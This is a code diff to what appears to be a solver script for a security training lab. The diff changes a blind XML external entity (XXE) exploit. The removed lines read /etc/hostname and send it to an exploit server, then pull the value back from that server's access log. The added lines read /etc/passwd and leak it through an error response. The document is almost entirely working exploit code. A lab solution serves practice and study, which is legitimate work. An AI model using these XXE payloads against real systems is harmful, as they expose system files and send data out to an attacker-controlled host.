@@ -13,10 +13,10 @@ def solve_lab(url, proxies):
     exploit_server = ExploitServer(url, proxies)
     head = ["HTTP/1.0 200 OK", "Content-Type: text/xml; charset=utf-8"]
     body = [
-        '<!ENTITY % file SYSTEM "file:///etc/hostname">',
-        f"<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM '{exploit_server.url}/?x=%file;'>\">",
+        '<!ENTITY % file SYSTEM "file:///etc/passwd">',
+        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
         "%eval;",
-        "%exfiltrate;",
+        "%error;",
     ]
     exploit_server.craft_response("/malicious.dtd", "\n".join(head), "\n".join(body))
 
@@ -37,25 +37,6 @@ def solve_lab(url, proxies):
     )
     print(f"{data}\n")
 
-    requests.post(url, proxies=proxies, verify=False, data=data)
-    print_success("XXE injection successful.\n")
-
-    print_info("Extracting hostname from exploit server log...")
-    log = exploit_server.access_log()
-    hostnames = re.findall(r"(?<=\/\?x=)[^ ]+", log)
-
-    if len(hostnames) == 0:
-        print_fail("Unable to extract hostname.")
-    else:
-        hostname = hostnames[-1]
-        print_success(f"Hostname: {hostname}\n")
-
-    print_info("Submitting hostname as solution...")
-    url = urljoin(url, "/submitSolution")
-    data = {"answer": hostname}
     resp = requests.post(url, proxies=proxies, verify=False, data=data)
-
-    if resp.json()["correct"]:
-        print_success("Correct answer!\n")
-    else:
-        print_fail("Incorrect answer.")
+    print_success("XXE injection successful with the following response:\n")
+    print(f"{resp.text}\n")
